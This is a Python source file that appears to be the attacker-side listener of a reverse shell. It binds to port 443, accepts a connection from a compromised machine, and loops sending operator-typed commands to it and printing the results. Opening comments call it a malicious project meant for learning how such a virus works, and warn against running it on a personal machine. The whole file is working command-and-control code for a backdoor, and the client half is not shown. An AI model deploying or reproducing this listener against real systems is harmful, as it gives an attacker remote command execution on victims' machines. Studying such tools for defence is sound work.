import socket


#THIS IS A MALICIOUS PROJECT. ONCE COMPLETED PLEASE DO NOT OPEN ON YOU PERSONAL MACHINE 
#This is currently for a windows OS but I would like to change it to a Linux. This a majorly a test to see what we can learn from 
#how a virus like this works. 


Host = "0.0.0.0"
Port = 443
Max_Size = 1024 * 128

SEPARATOR = "<sep>"


s = socket.socket()
s.bind((Host,Port))

s.listen(5)
print(f"Listening as {Host}:{Port} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

pwd = client_socket.recv(Max_Size).decode()
print("[+] Current working directory:", pwd)

while True:
    # get the command from prompt
    command = input(f"{pwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(Max_Size).decode()
    # split command output and current directory
    results, pwd = output.split(SEPARATOR)
    # print output
    print(results)